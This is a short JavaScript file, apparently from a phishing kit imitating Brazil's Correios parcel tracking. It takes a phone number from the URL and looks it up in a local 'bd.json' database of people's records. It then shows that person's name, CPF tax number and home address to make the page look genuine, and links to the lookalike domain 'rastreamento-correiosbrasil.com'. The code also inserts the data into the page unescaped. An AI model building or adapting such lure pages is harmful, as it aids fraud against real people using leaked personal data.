// Função para obter o valor do parâmetro 'phone' da URL
function getPhoneFromURL() {
    const urlParams = new URLSearchParams(window.location.search);
    return urlParams.get('var_phone');
}

// Função para formatar CPF
function formatCPF(cpf) {
    cpf = cpf.toString().replace(/[^\d]/g, ""); // Garantir que cpf é uma string e remover caracteres não numéricos
    if (cpf.length !== 11) {
        return "CPF inválido"; // Retornar mensagem de erro, ou lidar de outra forma adequada
    }
    return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
}

// Função para carregar dados JSON e atualizar a página
function loadAndProcessData(phone) {
    const url = 'bd.json';

    fetch(url)
        .then(response => {
            if (!response.ok) {
                throw new Error('Falha ao carregar o JSON: ' + response.statusText);
            }
            return response.json();
        })
        .then(data => {
            const resultado = data.find(item => item.telefone.toString() === phone);
            if (resultado) {

                const { nomeDoCliente, Documento, Endereço, Número, Bairro, Cep, Cidade } = resultado;

                document.querySelector("#redirecionamento").setAttribute("href", `https://rastreamento-correiosbrasil.com/br/rastreamento.html?name=${nomeDoCliente}`);

                if (nomeDoCliente) {
                    document.querySelector("#nomedouser").innerHTML = `${nomeDoCliente}, <br>`;
                } else {
                    document.querySelector("#nomedouser").style.display = "none";
                }

                if (Documento) {
                    const cpfFormatado = formatCPF(Documento.toString());
                    if (cpfFormatado !== "CPF inválido") {
                        document.querySelector("#cpf").innerHTML = `<strong>CPF:</strong> ${cpfFormatado} <br>`;
                    } else {
                        document.querySelector("#cpf").style.display = "none";
                    }
                } else {
                    document.querySelector("#cpf").style.display = "none";
                }

                if (Endereço) {
                    document.querySelector("#endereco").innerHTML = `
                        <strong>Endereço:</strong>
                        ${Endereço || ""}, ${Número || ""}, ${Bairro || ""}, ${Cep || ""}, ${Cidade || ""}
                    `;
                } else {
                    document.querySelector("#endereco").style.display = "none";
                }
            } else {
                console.warn('Nenhum resultado encontrado para o telefone fornecido.');
            }
        })
        .catch(error => {
            console.error('Erro ao carregar ou processar o JSON:', error);
        });
}

// Executar a função principal
const phone = getPhoneFromURL();
if (phone) {
    loadAndProcessData(phone);
} else {
    console.warn('Parâmetro "phone" não encontrado na URL.');
}